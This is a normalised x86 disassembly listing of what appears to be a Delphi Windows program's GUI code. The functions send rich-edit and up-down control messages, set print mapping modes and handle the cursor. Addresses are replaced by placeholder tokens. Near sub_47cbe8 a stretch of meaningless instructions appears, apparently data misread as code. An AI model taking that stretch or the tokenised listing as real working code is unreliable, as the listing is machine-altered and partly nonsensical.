xchg edx eax
call sub_404a68
pop esi
pop ebx
retn
sub_47b8c4
push ebx
push esi
add esp 0xffffff64
mov esi edx
mov ebx eax
mov eax ebx
call sub_448460
mov edx esi
mov eax ebx
call sub_44784c
mov edx esp
mov eax [ ebx + 0x23c ]
call sub_47a27c
mov [ esp + 0x4 ] 0x8
xor eax eax
mov al [ ebx + 0x224 ]
inc eax
mov [ esp + 0x18 ] ax
mov edx esp
mov eax [ ebx + 0x23c ]
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
sub_47b930
push ebx
mov ebx eax
cmp dl [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] dl
push 0x1
xor eax eax
mov al [ ebx + 0x258 ]
push eax
push 0x43f
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47b960
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x434
mov eax ebx
call sub_448484
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x0
push 0x437
mov eax ebx
call sub_448484
push eax
call SendMessageA
push 0x0
push 0x0
push 0x431
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47b9d4
push ebx
mov ebx eax
mov eax ebx
call sub_447a04
mov eax [ ebx + 0x70 ]
call sub_421054
push eax
push 0x0
push 0x443
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_47ba10
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] edx
mov [ esp + 0x4 ] edx
mov eax esp
push eax
push 0x0
push 0x437
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ecx
pop edx
pop ebx
retn
sub_47ba38
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x38 ]
xor ecx ecx
mov edx 0x30
call sub_402fc4
call sub_42c008
mov esi eax
lea eax [ esi + 0x18 ]
mov edx ebx
call sub_404480
mov eax esi
call sub_42b720
mov eax esi
call sub_42bb1c
mov ebx eax
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
push 0x58
mov eax esi
call sub_42bb1c
push eax
call GetDeviceCaps
mov ebx eax
push 0x5a
mov eax esi
call sub_42bb1c
push eax
call GetDeviceCaps
mov edi eax
mov eax [ ebp - 0x4 ]
add eax 0x278
call sub_406944
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
imul eax [ eax + 0x278 ] 0x5a0
cdq
idiv ebx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
imul eax [ eax + 0x27c ] 0x5a0
cdq
idiv edi
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
imul eax [ eax + 0x280 ] 0x5a0
cdq
idiv ebx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
imul eax [ eax + 0x284 ] 0x5a0
cdq
idiv edi
mov [ ebp - 0x24 ] eax
mov eax esi
call sub_42bb4c
imul eax eax 0x5a0
cdq
idiv ebx
mov [ ebp - 0x28 ] eax
mov eax esi
call sub_42bb30
imul eax eax 0x5a0
cdq
idiv edi
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp edi ebx
jle r-xdata
cmp ebx 0xffffffff
je r-xdata
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_441cd8
mov edi eax
mov [ ebp - 0xc ] 0xffffffff
push 0x1
mov eax [ ebp - 0x38 ]
push eax
call SetMapMode
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0x439
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
xor eax eax
push ebp
push sub_47bbff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42b7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc06
push 0x0
push 0x0
push 0x439
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetMapMode
retn
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_42b7dc
push esi
push edi
lea esi [ ebp - 0x48 ]
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x38 ]
push eax
push 0x1
push 0x439
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov ebx eax
cmp edi ebx
jle r-xdata
sub_47bc10
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_448484
push eax
call GetUpdateRect
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov esi [ ebp - 0x28 ]
mov eax esi
sub eax 0x3
mov ecx esi
mov edx [ ebp - 0x2c ]
call sub_4068c0
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
call sub_4068e4
test al al
je r-xdata
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_47bcc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_4466b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov [ rw-data ] 0x0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
mov eax ebx
call sub_448484
push eax
call InvalidateRect
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bcd0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446b1c
cmp [ esi + 0xc ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push esp
call GetCursorPos
mov eax esp
call sub_4074a8
mov [ esp + 0x8 ] eax
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_40742c
push eax
xor ecx ecx
mov edx 0x84
mov eax ebx
call sub_442f30
dec eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffffc
call sub_45ff34
push eax
call SetCursor
add eax 0xfffffffb
sub eax 0x2
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffffe
call sub_45ff34
push eax
call SetCursor
jmp r-xdata
sub_47bd60
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
sub edx 0x701
je r-xdata
lea edx [ eax + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xec ]
jmp r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov si 0xffb2
call sub_4038bc
jmp r-xdata
sub edx 0x2
je r-xdata
lea edi [ eax + 0x18 ]
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax esi
call sub_47be0c
test al al
jne r-xdata
sub edx 0x4
je r-xdata
mov [ ebx + 0xc ] 0x1
mov edi eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0xc ]
mov eax esi
call sub_47bddc
test al al
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_47bddc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_47be0c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_47be7c
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_441520
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_441544
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_403a24
add edx eax
mov eax ebx
call sub_441544
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47bf30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_473ae8
mov edx ebx
mov eax esi
call sub_4453e0
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44530c
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_47bfc4
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_44550c
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_441520
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_40742c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_448484
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_40742c
push eax
push 0x0
push 0x467
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_47c4e8
push 0x0
mov eax [ ebx + 0x20c ]
call sub_448484
push eax
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c09c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4038bc
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4038bc
sub_47c0f4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_446ad4
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_448484
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_47c124
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4038bc
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4038bc
sub_47c198
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_47c254
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_47c17c
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_47c2ac
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_403624
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
mov edi eax
test edi edi
jne r-xdata
sub_47c2dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c4ba
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_445284
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c4c1
lea eax [ ebp - 0x18 ]
call sub_40442c
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_445248
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_445248
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_445248
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_445248
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax esi
call sub_403608
mov edx r-xdata
call sub_47c2ac
test al al
jne r-xdata
mov eax esi
call sub_403608
mov edx r-xdata
call sub_47c2ac
test al al
jne r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47c4e8
push 0x0
mov eax esi
call sub_448484
push eax
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_408a8c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_441d94
sub_47c4e8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_448484
push eax
push 0x469
mov eax ebp
call sub_448484
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_441520
mov edx edi
sub edx ebp
mov eax ebx
call sub_4414d4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47c53c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_448788
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_448484
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_47c58c
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_47c5c4
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_448788
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_40742c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c60c
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_448788
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_40742c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c654
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c6b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c783
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_47c17c
test al al
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_40742c
push eax
push 0x0
push 0x467
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_408a8c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_441d94
sub_47c78c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_445ac0
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c800
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_445ac0
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c83c
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_445ac0
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c878
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_445ac0
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c8b4
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_445ac0
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_47c8f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_4171e4
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_416ddc
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x13
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_47cecc
call sub_448788
test al al
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_416e68
push eax
mov eax edi
call sub_47cecc
call sub_448484
lea ecx [ ebp - 0x21 ]
pop edx
call sub_4291b4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47c998
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_47cecc
call sub_448788
test al al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_416e14
mov eax esi
call sub_47cf08
test bl bl
jle r-xdata
mov eax ebp
call sub_416e68
push eax
mov eax [ ebp + 0x4 ]
call sub_47cecc
call sub_448484
pop edx
call sub_4291c4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403a74
sub_47c9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_416b70
push ebx
push r-xdata
push ebx
push sub_47ca68
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_47ca3e
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41a8a8
mov eax ebx
call sub_41a7f8
mov edx eax
mov eax esi
call sub_47cd14
mov eax ebx
call sub_41a8b0
pop esi
pop ebx
retn
sub_47ca68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41ca0c
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_41c940
mov eax ebx
call sub_41ca14
pop esi
pop ebx
retn
sub_47ca8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_47cecc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_448788
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x289 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_418964
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x8 ]
mov [ edx + 0x248 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47cb72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_41c1f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
call sub_418900
retn
sub_47cb88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4171e4
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_416e44
push ebp
call sub_47ca8c
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4171ec
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_47cbe8
adc [ ebx ] eax
cmp [ cs : esi ] dh
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push esp
adc [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
call [ eax - 0x75 ]
inc esi
add al 0xe8
dec esp
add al [ eax ]
add al ch
push [ edi + 0x4d8bfffc ]
cld
insb
jae r-xdata
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_47ccaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_416f90
mov eax [ esi + 0x4 ]
call sub_4171e4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_4171e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4171e4
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_416e44
push ebp
call sub_47ca8c
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
